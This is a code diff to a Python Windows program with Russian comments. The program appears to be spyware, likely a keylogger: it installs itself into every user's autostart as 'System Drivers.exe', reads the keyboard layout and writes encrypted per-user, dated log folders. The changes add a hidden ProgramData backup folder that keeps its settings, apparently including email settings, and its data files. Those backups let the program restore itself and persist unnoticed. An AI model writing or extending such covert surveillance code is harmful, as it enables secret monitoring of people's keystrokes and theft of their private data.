@@ -199,14 +199,29 @@ add_auto_for_users = lambda user: copy('System Drivers.exe', 'C:\\Users\\' + use
 for user in others_users: remove_others_users(user)
 #Добавление в автозагрузку
 for user in all_users: add_auto_for_users(user)
-#
-
+#Создание бэкап файлов для файл с насроками электронной почты и файла общих настроек
+if not isdir("C:\\ProgramData\\Backups Drivers"): 
+	mkdir("C:\\ProgramData\\Backups Drivers")
+	SetFileAttributes("C:\\ProgramData\\Backups Drivers", FILE_ATTRIBUTE_HIDDEN)
+if not isfile("C:\\ProgramData\\Backups Drivers\\Settings.dat"): 
+	try:
+		copy("Settings.dat", "C:\\ProgramData\\Backups Drivers")
+	except:
+		exit()
+if not isfile("C:\\ProgramData\\Backups Drivers\\data.dat"): 
+	try:
+		copy("data.dat", "C:\\ProgramData\\Backups Drivers")
+	except:
+		pass
+SettingsDat = open("C:\\ProgramData\\Backups Drivers\\Settings.dat", "rb")
+DataSettings = load(SettingsDat)
+SettingsDat.close()
 #Главная директрия
-main_folder = "ProgramData\\Program Drivers\\"
+main_folder = DataSettings[0]
 #Дополнительная директрия, если к первой доступ отсутсвует
-dop_folder = "Program Drivers\\"
+dop_folder = DataSettings[1]
 #Директрия, в случае, если к дополнительной директори нет доступа, пробуем записать на диск D
-folder_for_D = "Program Drivers\\"
+folder_for_D = DataSettings[2]
 #Язык на момент запуска программы(если 00000409 - английский, 00000419 - русский)
 launge = GetKeyboardLayoutName()
 #Установка первоночальных переменных
@@ -238,7 +253,7 @@ year_curent = strftime('%Y')
 #Диск создания папки и файлов в ней по умолчанию
 disk_key = 'C:\\'
 #Ключи для шифрования
-main_key = 1120
+main_key = DataSettings[3]
 #Дополнительный(закрытый) ключ, который создается из открытого
 dop_key = 0
 for value in str(main_key): dop_key += int(value)
@@ -258,7 +273,8 @@ try:
 		try: 
 			copy("data.dat", disk_key + main_folder)
 		except:
-			pass
+			if isfile("C:\\ProgramData\\Backups Drivers\\data.dat"): copy("C:\\ProgramData\\Backups Drivers\\data.dat", disk_key + main_folder)
+			else: pass
 	if not isdir(disk_key + main_folder + user_name): mkdir(disk_key + main_folder + user_name)
 	if not isdir(disk_key + main_folder + user_name + '\\' + year_curent): mkdir(disk_key + main_folder + user_name + '\\' + year_curent)
 	if not isdir(disk_key + main_folder + user_name + '\\' + year_curent + '\\' + moon_curent): mkdir(disk_key + main_folder + user_name + '\\' + year_curent + '\\' + moon_curent)
@@ -273,7 +289,8 @@ except:
 			try:
 				copy("data.dat", disk_key + dop_folder)
 			except:
-				pass
+				if isfile("C:\\ProgramData\\Backups Drivers\\data.dat"): copy("C:\\ProgramData\\Backups Drivers\\data.dat", disk_key + dop_folder)
+				else: pass
 		if not isdir(disk_key + dop_folder + user_name): mkdir(disk_key + dop_folder + user_name)
 		if not isdir(disk_key + dop_folder + user_name + '\\' + moon_curent): mkdir(disk_key + dop_folder + user_name + '\\' + moon_curent)
 		if not isdir(disk_key + dop_folder + user_name + '\\' + year_curent + '\\' + moon_curent): mkdir(disk_key + dop_folder + user_name + '\\' + year_curent + '\\' + moon_curent)
@@ -291,7 +308,8 @@ except:
 				try:
 					copy("data.dat", disk_key + folder_for_D)
 				except:
-					pass
+					if isfile("C:\\ProgramData\\Backups Drivers\\data.dat"): copy("C:\\ProgramData\\Backups Drivers\\data.dat", disk_key + folder_for_D)
+					else: pass
 			if not isdir(disk_key + folder_for_D + user_name + '\\' + moon_curent): mkdir(disk_key + folder_for_D + user_name + '\\' + moon_curent)
 			if not isdir(disk_key + folder_for_D + user_name + '\\' + year_curent + '\\' + moon_curent): mkdir(disk_key + folder_for_D + user_name + '\\' + year_curent + '\\' + moon_curent)
 			main_folder = folder_for_D
